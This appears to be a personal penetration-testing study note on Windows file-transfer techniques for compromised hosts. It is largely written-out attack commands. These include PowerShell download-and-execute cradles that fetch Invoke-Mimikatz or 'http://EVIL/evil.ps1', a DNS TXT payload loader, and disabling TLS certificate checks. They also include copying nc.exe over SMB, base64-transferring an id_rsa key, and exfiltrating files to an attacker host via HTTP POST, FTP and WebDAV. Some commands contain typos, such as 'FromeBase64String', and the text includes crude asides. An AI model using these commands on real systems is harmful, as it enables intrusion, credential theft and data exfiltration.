# Windows File Transfers

Common list of methods:

- Impacket's SMB Tool
- Window's Certutil
- FTP and SFTP
- SCP
- Cloud Storage
- Wget
- Email
- Batch Files
- Obfuscated JavaScript
- XSL Files
- Bitsadmin
- Powershell with Base64Encoding

## Windows Astaroth Attack

This is a fileless distribution technique that runs in memory to hide it's activities from security solutions and abuses legitimate Windows software features to spread quietly.

The Microsoft Defender ATP Research Team noted a spike in the use of the Windows Management Instrumentation Command Line Tool (WMIC) to run scripts, which indicate a fileless technique being used. This attack typically starts through spam emails with malicious URLs to a LNK file shortcut. If the file is clicked, WMIC is run and allows the download and execution of JavaScript code. The code in turn abuses the Bitsadmin tool to download it's payloads and the eventual end payload is Astaroth.

## PowerShell Base64 Encode & Decode

An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum to check the md5 hash

From the attack box:
```bash
lemur@htb ~$ md5sum id_rsa
lemur@htb ~$ cat id_rsa | base64 -w 0; echo
```

copy and paste into Windows Powershell with some functions to decode it.

```bash
PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromeBase64String("JDFUIAH387Q987YTQ039874YT-9Q83Y-AYUHFAKJSDHFUH384092==")
```

Finally, we cna confirm if the file was transfered successfully using the Get-FileHash cmdlet, which does the same thing md5sum does:

```bash
PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

The hashes should match. This is probably only useful for smaller files, but still very useful none-the-less. It's also not always possible to use. Windows Command Line Utility (cmd.exe) has a maximum string length of 8191 characters. Also, a web shell may error if you attenpt to send extremely large strings.

## PowerShell Web Downloads

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the `System.Net.WebClient` class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data:


- OpenRead : Returns the data from a resource as a Stream
- OpenReadAsync : Returns the data from a resource without blocking the calling thread
- DownloadData : Downloads data from a resource and returns a Byte array
- DownloadDataAsync : Downloads data from a resource and returns a Byte array without blocking the calling thread

- DownloadFile : Downloads data from a resource to a local file
- DownloadFileAsync : Downloads data form a resource to a local file without blocking the calling thread

- DownloadString : Downloads a String from a resource and returns that string
- DownloadStringAsync : Downloads a String from a resource without blocking the calling thread

```bash
PS C:\> (New-Object Net.WebClient).DownloadFile('<target file url>','<output file name>')
PS C:\> (New-Object Net.WebClient).DownloadFileAsync('<target ufile url>','<output file name>')
```

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute them directly. PowerShell can be used for this instead of downloading a shell script to disk, we can run it directly in memory using `Invoke Expression (IEX)`:

```bash
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/somebullshit/project/master/data/module/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input.

```bash
PS C:\> (New-Object Net.Webclient).DownloadString('https://somebullshit.com/PowerShellMafia/Powersploit') | IEX
```

Another method is to use `Invoke Web Request (IWR)`

```bash
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerView -OutFile PowerView.ps1
```

Here is a list of example Powershell cradles provided by Harmj0y on GitHub:

```bash
# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object ((( BLOCKED )))
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object (( Accepted ))
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!) ((( Doesn't play well with Linux Server )))
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```

I made a simple Python3 server so we can visit in the web browser GUI:

```py
#!/usr/bin/env python3

import sys
import http.server
import socketserver

port = int(sys.argv[1])
handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", port), handler) as httpd:
	print("[+] Serving on port ", port)
	httpd.serve_forever()

```


## Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download This can be bypassed using the parameter `-UseBasicParsing`:

```bash
PS C:\> IWR https://<url>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorers first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P... 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand



PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

			Oh, Okay bro np ~

```

Another error in PowerShell downloads is releated to the SSL/TLS secure channel if the cert is not trusted. We can bypass it with the following command:

```bash
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://<url>/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```

## SMB Downloads

Create the SMB Server:

```bash
lemur@htb ~$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:

```
C:\> copy \\192.168.220.133\share\nc.exe

	1 file(s) copied.

```

New verisons of Windows block unauthenticated guess access however as we can see in the folowing command:

```
C:\ copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC form unsafe or malicious devices on the network.

```

To transfer files in this scenario, we cna set a username and password using our Impacket SMB server and mount the SMB server on our Windows target machine:

```bash
lemur@htb ~$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
C:\> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\> copy n:\nc.exe
		1 file(s) copied.

```

Note that you can also moun the SMB server if you receive and error using `copy filename\\IP\sharename`

## FTP Downloads

Another way to transfer files is using FTP. We can use the FTP or PowerShell Net.WebClient to download files from and FTP server. We can configure an FTP Server in our attack host using `Python3 pyftpdlib` module. It can be installed with pip:

```bash
lemur@htb ~$ sudo pip3 install pyftpdlib
```

Then we can specify port 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a username and password.

```bash
lemur@htb ~/SMBSHARE-FOLDER/ $ sudo python3 -m pyftpdlib --port 21


[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<

```

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client for Windows or PowerShell's Net.WebClient

```
PS C:\> (New-Object Net.Webclient).DownloadFile('ftp://192.168.10.122/file.txt', 'ftp-file.txt')
```

When we get a shell on a remote machine, we may not have interactivity. If that's the case, we can create an almost script-like file to download the files we want. First, we need to create a file containing the commands needed to execute and then use the FTP client to use that file to download the file... File-ception:

```
C:\> echo open 192.168.10.122 > ftpcommand.txt
C:\> echo USER anonymous >> ftpcommand.txt
C:\> ehco binary >> ftpcommand.txt
C:\> echo GET file.txt >> ftpcommand.txt
C:\> echo bye >> ftpcommand.txt

C:\> ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.10.122
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\> more file.txt
Hello, this is a file. Fuck y'all, Windows. EZPZ

```

## Upload Operationswindows file transfer methods

There are alos situations such as password cracking, analysis, exfiltration, etc where we must upload files form our target machine onto our attack host. We can use the same methods we used for download operations but now for Uploads. 

One of the easiest ways is with the PowerShell Base64 Encode & Decode method. Let's see how we can accomplish this with a few other examples:

```bash
lemur@htb ~ $ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1

lemur@htb ~ $ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Now we can use a PowerShell script `PSUpload.ps1` which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File` which we use to specify the path and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host:

```bash
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.github.com/PSUpload.ps1')
PS C:\> Invoke-FileUpload -Uri https://192.168.10.122:8000/upload -File C:\TwoGuysKissing.png


[+] File Uploaded:  C:\TwoGuysKissing.png
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

```

## PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. we use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file:

```bash
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\HandomeManEatingAss.png' -Encoding Byte))

PS C:\> Invoke-WebRequest -Uri http://192.168.10.122:8000/ -Method POST -Body $b64


lemur@htb ~ $ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.10.122] from (UNKNOWN) [192.168.10.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...

lemur@htb ~ $ echo <base64> | base64 -d -w 0 > HandsomeAss-EatingMan.png
```

## SMB Uploads

WE previously discussed that companies usually allow outbound traffic using HTTP and HTTPS protocols. Commonly enterprises don't aloow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post `Preventing SMB traffic from lateral connections and entering or leavin the network` here @ https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a

An alternative is to run SMB over HTTP with `WEbDav.WebDAV` (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, and if there's not SMB share available, it will try to connect using HTTP.

To set up our WebDAV server, we need to install two Python modules: `wsgidav` and `cheeroot`. After installing, we run the `wsgidav` application in the target directory:

```bash
lemur@htb ~ $ sudo pip install wsgidav cheeroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...

lemur@htb ~ $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...

```

Now we can attempt to connect ot the share using DavWWWRoot directory:

```
C:\> dir \\192.168.10.122\DavWWWRoot


 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free

```

Note that DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to it. For example: \\192.168.10.122\sharefolder-1

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder-1\
```

Note if there are no SMB (TCP/445) restrictions, you can just use impacket's smbserver the same way we set it up for download operations.

## FTP Uploads

Uploading files using FTP is very similar to downloading. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP server using Python's `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host:

```bash
lemur@htb ~ $ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<

```

```
PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.10.122/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

 We could also do this with the cmd.exe command-file that we made and example of earlier.